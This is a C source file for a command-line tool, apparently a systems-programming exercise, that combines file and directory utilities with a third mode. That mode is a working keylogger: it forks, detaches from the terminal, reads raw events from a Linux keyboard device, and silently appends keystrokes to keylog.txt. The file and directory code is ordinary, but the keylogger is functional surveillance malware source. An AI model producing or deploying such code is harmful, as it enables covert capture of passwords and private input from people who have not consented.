#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <ctype.h>
#include <sys/wait.h>

// ================ File Operations BEGIN (Mode 1) ================
void create_file(const char *filename, int truncateExisting) {
    int flags = O_RDWR | O_CREAT;
    if (truncateExisting) {
        flags |= O_TRUNC;
    }
    int fd = open(filename, flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    if (fd == -1) {
        perror("Error creating/opening file");
    } else {
        printf("File '%s' created/opened successfully. Descriptor: %d\n", filename, fd);
        close(fd);
    }
}

void open_file(const char *filename, int readWrite) {
    int fd;
    if (readWrite) {
        fd = open(filename, O_RDWR);
    } else {
        fd = open(filename, O_RDONLY);
    }
    if (fd == -1) {
        perror("Error opening file");
    } else {
        printf("File '%s' opened successfully. Descriptor: %d\n", filename, fd);
        close(fd);
    }
}

void change_file_permission(const char *filename, mode_t permission) {
    if (chmod(filename, permission) == -1) {
        perror("Error changing file permission");
    } else {
        printf("Permissions changed for '%s'.\n", filename);
    }
}

void read_file(const char *filename) {
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror("Error opening file for reading");
        return;
    }
    char buffer[1024];
    ssize_t bytesRead;
    printf("Contents of '%s':\n", filename);
    while ((bytesRead = read(fd, buffer, sizeof(buffer) - 1)) > 0) {
        buffer[bytesRead] = '\0';
        printf("%s", buffer);
    }
    if (bytesRead == -1) {
        perror("Error reading file");
    }
    close(fd);
}

void write_file(const char *filename) {
    int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    if (fd == -1) {
        perror("Error opening file for writing");
        return;
    }
    printf("Enter text (end with Ctrl+D):\n");
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), stdin) != NULL) {
        ssize_t written = write(fd, buffer, strlen(buffer));
        if (written == -1) {
            perror("Error writing to file");
            close(fd);
            return;
        }
    }
    if (ferror(stdin)) {
        perror("Error reading input");
    }
    close(fd);
    printf("Content written to '%s'.\n", filename);
}

void remove_file_op(const char *filename) {
    if (unlink(filename) == -1) {
        perror("Error removing file");
    } else {
        printf("File '%s' removed successfully.\n", filename);
    }
}
// ================ File Operations END (Mode 1) ================


// ================ Directory Operations BEGIN (Mode 2) ================
// Create directory function
void create_directory(const char *path) 
{
    if (mkdir(path, S_IRWXU | S_IRWXG | S_IRWXO) == 0) {
        printf("Directory created successfully.\n");
    } else {
        perror("mkdir");
    }
}

// Remove directory function
void remove_directory(const char *path) {
    // Block removal of critical system directories
    if (strcmp(path, "/") == 0 || strcmp(path, "/home") == 0 || strcmp(path, "/root") == 0) {
        fprintf(stderr, "Error: Attempt to remove a critical system directory is not allowed.\n");
        return;
    }

    if (rmdir(path) == 0) {
        printf("Directory removed successfully.\n");
    } else {
        perror("rmdir");
    }
}

// Print working directory function
void print_working_directory() {
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        printf("Current working directory: %s\n", cwd);
    } else {
        perror("getcwd");
    }
}

// List directory function
void list_directory(const char *path) {
    struct dirent *entry;
    DIR *dir_ptr = opendir(path);

    if (dir_ptr == NULL) {
        perror("opendir");
        return;
    }
    while ((entry = readdir(dir_ptr))) {
        printf("%s\n", entry->d_name);
    }
    closedir(dir_ptr);
}
// ================ Directory Operations END (Mode 2) ================

// ================ Keylogger Operations BEGIN (Mode 3) ================
// Write timestamp to keylog.txt
void write_timestamp(int fd) 
{
    time_t t;
    struct tm *tm_info;
    char timestamp[26];

    // Get current time and format
    time(&t);
    tm_info = localtime(&t);
    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S\n", tm_info);

    // Write timestamp to file
    write(fd, "\n", 1); // New line
    write(fd, "\n", 1); // New line
    write(fd, timestamp, strlen(timestamp));
}

static int isShiftPressed = 0;

// Function to convert keycode to character
char keycode_to_char(int keycode) 
{
    // Define regular key map
    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
    
    // Define key mapping for shifted keys
    char *shift_map = "..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"...ZXCVBNM<>?";

    if (keycode == 57) 
    {
        return ' ';  // Space key
    }

    if (keycode == 42) 
    {
        isShiftPressed = 1;  // Shift key press
        return 0;
    }

    // Detect Ctrl key
    if (keycode == 29 || keycode == 297 || keycode == 28 || keycode == 14) 
    {
        return 0;
    }

    // Check if keycode is within the valid range
    if (keycode >= 0 && keycode < KEY_MAX) 
    {
        char ch;

        // If Shift is pressed, use the shifted map
        if (isShiftPressed) {
            ch = shift_map[keycode];
            isShiftPressed = 0;  // Reset Shift
        } else {
            // Use regular map for non-shifted characters
            ch = map[keycode];
        }

        return ch;
    }

    return 0;  // Return 0 if the keycode is out of range or not mapped
}

int run_keylogger(const char *input_device) 
{
    if (!input_device) 
    {
        fprintf(stderr, "No input device specified.\n");
        return 1;
    }

    pid_t pid = fork();
    if (pid < 0) 
    {
        perror("Fork failed");
        return 1;
    }

    if (pid > 0) 
    {
        // Parent process
        //Print the child process ID
        printf("Child process PID: %d\n", pid);

        printf("Keylogger operation successful. You may now close this terminal\n");

        exit(0);
        return 0;
    }

    // Child process
    // Step 1: Create a new session and detach from the terminal
    if (setsid() < 0) 
    {
        perror("Failed to create new session");
        return 1;
    }

    // Step 2: Redirect output to a log file
    int output_fd = open("keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (output_fd == -1) 
    {
        perror("Unable to open keylog.txt");
        return 1;
    }

    // Write timestamp at the start of the session
    write_timestamp(output_fd);

    // Step 3: Close standard file descriptors (stdin, stdout, stderr)
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Open keylog.txt for output
    if (dup2(output_fd, STDOUT_FILENO) == -1 || dup2(output_fd, STDERR_FILENO) == -1) 
    {
        perror("Failed to redirect output to keylog.txt");
        return 1;
    }

    // Step 4: Open the keyboard input device (from CLI argument)
    int input_fd = open(input_device, O_RDONLY);
    if (input_fd == -1) 
    {
        perror("Unable to open input device");
        close(output_fd);
        return 1;
    }

    struct input_event ev;
    int isCtrlPressed = 0;
    int isEnterPressed = 0;
    int isBackPressed = 0;

    // Capture keystrokes and log them
    while (1) 
    {
        // Read an input event
        ssize_t bytes_read = read(input_fd, &ev, sizeof(struct input_event));
        if (bytes_read < (ssize_t)sizeof(struct input_event)) 
        {
            perror("Failed to read input event");
            break;
        }

        // Only log key events (type 1 is key event)
        if (ev.type == EV_KEY) 
        {
            // If it's a key press event
            if (ev.value == 1) 
            {
                // Check for Ctrl key press
                if (ev.code == 29 || ev.code == 297) 
                { // Left or Right Ctrl key
                    isCtrlPressed = 1;
                    write(output_fd, "[Ctrl]", 6);  // Log [Ctrl] to the file
                } 
                else if (ev.code == 28)
                {
                    isEnterPressed = 1;
                    write(output_fd, "[Enter]", 7);  

                }
                else if (ev.code == 14)
                {
                    isEnterPressed = 1;
                    write(output_fd, "[Backspace]", 11);  

                }
                else 
                {
                    char key_char = keycode_to_char(ev.code);
                    if (key_char != 0) 
                    {
                        write(output_fd, &key_char, 1); // Write the character to the file
                    }
                }
            } 
            // If it's a key release event (release Ctrl key)
            else if (ev.value == 0 && (ev.code == 29 || ev.code == 297 || ev.code == 28 || ev.code == 14)) 
            {
                isCtrlPressed = 0;  // Reset Ctrl state on release
                isEnterPressed = 0;
                isBackPressed = 0;
            }
        }
    }

    // Close file descriptors
    close(input_fd);
    close(output_fd);

    return 0;
}
// ================ Keylogger Operations END (Mode 3) ================

// Main function
int main(int argc, char *argv[]) {
    /*
      Usage examples:
        // FILE (mode=1):
        ./supercommand -m 1 1 newFile.txt           // Create file (create if not exist)
        ./supercommand -m 1 1 newFile.txt trunc     // Create file (truncate if exist)
        ./supercommand -m 1 2 existingFile.txt rw   // Open file read/write
        ./supercommand -m 1 3 file.txt 0644         // Change file permission to 0644
        ./supercommand -m 1 4 file.txt              // Read file
        ./supercommand -m 1 5 file.txt              // Write to file
        ./supercommand -m 1 6 file.txt              // Remove file

        // DIRECTORY (mode=2):
        ./supercommand -m 2 1 myDir                 // Create directory
        ./supercommand -m 2 2 myDir                 // Remove directory
        ./supercommand -m 2 3                       // Print working directory
        ./supercommand -m 2 4 myDir                 // List files in directory

        ./sudo supercommand -m 3 /dev/input/event2  // Keylogger mode

    */
    if (argc < 3) {
        fprintf(stderr, "Usage: %s -m <mode> <operation> <args>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "-m") != 0) {
        fprintf(stderr, "Error: Missing or incorrect '-m' flag.\n");
        return 1;
    }
    
    // atoi() is used to convert string to integer
    int mode = atoi(argv[2]);
    int operation = atoi(argv[3]);

    switch (mode) {
        // ========== MODE 1: FILE OPERATIONS ==========
        // File Operation
        case 1:
            const char *filename = argv[4];
    
            switch (operation) {
                case 1: // create
                    if (argc >= 6 && strcmp(argv[5], "trunc") == 0) {
                        create_file(filename, 1);
                    } else {
                        create_file(filename, 0);
                    }
                    break;
                case 2: // open
                    if (argc >= 6 && strcmp(argv[5], "rw") == 0) {
                        open_file(filename, 1);
                    } else {
                        open_file(filename, 0);
                    }
                    break;
                case 3: // change permission
                    if (argc < 6) {
                        fprintf(stderr, "Error: Missing permission. Example: 0644\n");
                        return 1;
                    } else {
                        mode_t perm = (mode_t)strtol(argv[5], NULL, 8);
                        change_file_permission(filename, perm);
                    }
                    break;
                case 4: // read
                    read_file(filename);
                    break;
                case 5: // write
                    write_file(filename);
                    break;
                case 6: // remove
                    remove_file_op(filename);
                    break;
                default:
                    fprintf(stderr, "Error: Invalid file operation.\n");
                    return 1;
            }
            break;
        // ========== MODE 2: DIRECTORY OPERATIONS ==========
        // Directory Operation
        case 2:
            switch (operation) {
                case 1:
                    if (argc == 5) {
                        create_directory(argv[4]);
                    } else {
                        fprintf(stderr, "Invalid directory operation.\n");
                        return 1;
                    }
                    break;
                case 2:
                    if (argc == 5) {
                        remove_directory(argv[4]);
                    } else {
                        fprintf(stderr, "Invalid directory operation.\n");
                        return 1;
                    }
                    break;
                case 3:
                    if (argc == 4 || (argc == 5 && strcmp(argv[4], ".") == 0)) {
                        print_working_directory();
                    } else {
                        fprintf(stderr, "Invalid directory operation.\n");
                        return 1;
                    }
                    break;
                case 4:
                    if (argc == 5) {
                        list_directory(argv[4]);
                    } else {
                        fprintf(stderr, "Invalid directory operation.\n");
                        return 1;
                    }
                    break;
                default:
                    fprintf(stderr, "Invalid directory operation.\n");
                    return 1;
            }
            break;
        // ========== MODE 3: KEYLOGGER OPERATIONS ==========
        // Keylogger Operation
        case 3:
            if (argc < 3) 
            {
                fprintf(stderr, "Usage: %s -m <mode> [additional arguments]\n", argv[0]);
                return 1;
            }

            int mode = atoi(argv[2]);
            if (mode == 3) 
            {
                if (argc < 4) 
                {
                    fprintf(stderr, "No input device specified for keylogger mode.\n");
                    return 1;
                }

                const char *input_device = argv[3];
                printf("Powering up key logger...\n");
                return run_keylogger(input_device);
            }

            fprintf(stderr, "Unknown mode: %d\n", mode);
            return 1;
            }
    return 0;
}
